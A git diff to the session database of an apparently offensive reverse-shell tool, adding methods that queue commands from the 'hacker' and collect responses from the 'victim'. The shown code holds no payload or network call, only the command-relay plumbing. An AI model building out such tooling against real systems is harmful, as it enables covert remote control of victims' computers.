@@ -9,11 +9,16 @@ from http import HTTPStatus
 
 # from http.client import HTTPMessage
 from pathlib import Path
-from typing import Any, Literal, Optional
+from typing import Any, Literal, Optional, TypedDict
 
 import reverse_shell.utils as ut
 from reverse_shell import __app_name__, __version__
 from reverse_shell.server import ErrorCodes as ec
+
+
+class Communication(TypedDict):
+    command: str | None
+    responses: list[str]
 
 
 class Database:
@@ -188,9 +193,7 @@ class Sessions:
         }
 
         # The way the hacker and the victim talk is through this database.
-        self._session_communications: dict[
-            str, dict[Literal["command", "responses"], str | list[str]]
-        ] = {
+        self._session_communications: dict[str, Communication] = {
             # session_id: {
             #   command: "some command"
             #   responses: ["Some responses", "here and there"]
@@ -214,7 +217,10 @@ class Sessions:
             "victim_id": victim_id,
         }
 
-        self._session_communications[session_id] = {"command": "", "responses": []}
+        self._session_communications[session_id] = {
+            "command": None,
+            "responses": [],
+        }
 
         # And also add the hacker and victim in the client list
         self._client_list.extend([hacker_id, victim_id])
@@ -256,6 +262,46 @@ class Sessions:
         ][0]
 
         return session_id
+
+    def insert_command(self, session_id: str, cmd: str):
+        """Insert a new in the session provided"""
+        # First let's see if the session is active
+        if not self.check_session_active(session_id):
+            raise Exception("Given session_id isn't active.")
+
+        # Now let's insert the command inside the session
+        self._session_communications[session_id]["command"] = cmd
+
+    def insert_response(self, session_id: str, res: str):
+        """Add the response given in the responses list."""
+        # As always first check if the session is active
+        if not self.check_session_active(session_id):
+            raise Exception("Given session_id isn't active")
+
+        # Now append the response in the list of responses
+        self._session_communications[session_id]["responses"].append(res)
+
+    def get_command(self, session_id: str):
+        """Fetch the command from the communications."""
+        if not self.check_session_active(session_id):
+            raise Exception("Given session_id is not active.")
+
+        # Fetch the command from the session communications
+        cmd = self._session_communications[session_id]["command"]
+        # Resetting the command to an empty string
+        self._session_communications[session_id]["command"] = None
+        return cmd
+
+    def get_response(self, session_id: str):
+        """Fetch the responses from the communications"""
+        # Check if the session is active
+        if not self.check_session_active(session_id):
+            raise Exception("Given session_id is not active.")
+
+        # Fetch all responses
+        res = self._session_communications[session_id]["responses"]
+        self._session_communications[session_id]["responses"] = []
+        return res
 
     def check_session_active(self, session_id: str):
         """Check if the given session exists and is active."""
